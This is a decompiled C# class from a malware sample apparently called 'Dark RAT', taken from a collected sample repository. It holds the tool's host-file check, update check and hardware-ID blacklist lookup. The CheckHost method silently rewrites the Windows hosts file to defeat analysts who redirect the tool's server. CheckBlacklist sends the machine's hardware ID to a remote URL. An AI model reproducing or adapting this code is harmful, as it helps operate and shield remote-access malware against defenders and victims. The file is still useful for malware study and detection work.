// Decompiled with JetBrains decompiler
// Type: Dark_RAT.Host_file_check
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [StandardModule]
  internal sealed class Host_file_check
  {
    private static object @checked = (object) false;

    public static object CheckHost(string Sitename, string Siteip)
    {
      int num1 = 0;
      string str1 = "Error";
      string str2;
      while (true)
      {
        if (num1 >= 3)
        {
          int num2 = (int) Interaction.MsgBox((object) "It appears you are trying to spoof our site inside your host file.");
          Environment.Exit(0);
          str1 = "Error";
        }
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\\\hosts";
          StreamReader streamReader = new StreamReader(path);
          string end = streamReader.ReadToEnd();
          streamReader.Close();
          if (end.Contains(Sitename))
          {
            Host_file_check.@checked = (object) true;
            string str3 = Strings.Replace(end, Sitename, "google");
            StreamWriter streamWriter = new StreamWriter(path);
            streamWriter.Write(str3);
            streamWriter.Dispose();
            checked { ++num1; }
          }
          else if (end.Contains(Siteip))
          {
            Host_file_check.@checked = (object) true;
            string str4 = Strings.Replace(end, Siteip, "google");
            StreamWriter streamWriter = new StreamWriter(path);
            streamWriter.Write(str4);
            streamWriter.Dispose();
            checked { ++num1; }
          }
          else
          {
            if (Operators.ConditionalCompareObjectEqual(Host_file_check.@checked, (object) true, false))
              Application.Restart();
            return (object) "Nothing";
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num3 = (int) Interaction.MsgBox((object) "An unauthorized move was made, and this program failed to fix it.", MsgBoxStyle.Critical);
          Environment.Exit(0);
          str2 = "Error";
          ProjectData.ClearProjectError();
          break;
        }
      }
      return (object) str2;
    }

    public static object CheckUpdate(string URL)
    {
      if (Conversions.ToString(LoginSystem.GetSource(URL)).Contains("Update"))
      {
        MyProject.Forms.UpdateF.Show();
        return (object) "Yes";
      }
      MyProject.Forms.LoginForm.Enabled = true;
      MyProject.Forms.LoginForm.ToolStripStatusLabel1.Text = "Status: No update available";
      return (object) "No";
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static object CheckBlacklist(string URL)
    {
      object objectValue = RuntimeHelpers.GetObjectValue(LoginSystem.GetSource(Conversions.ToString(Operators.ConcatenateObject((object) (URL + "?hwid="), LoginSystem.HWID()))));
      if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(objectValue, (object) "", false))))
        return (object) false;
      int num = (int) MessageBox.Show(Conversions.ToString(objectValue), "Sorry", MessageBoxButtons.OK);
      ProjectData.EndApp();
      return (object) true;
    }
  }
}
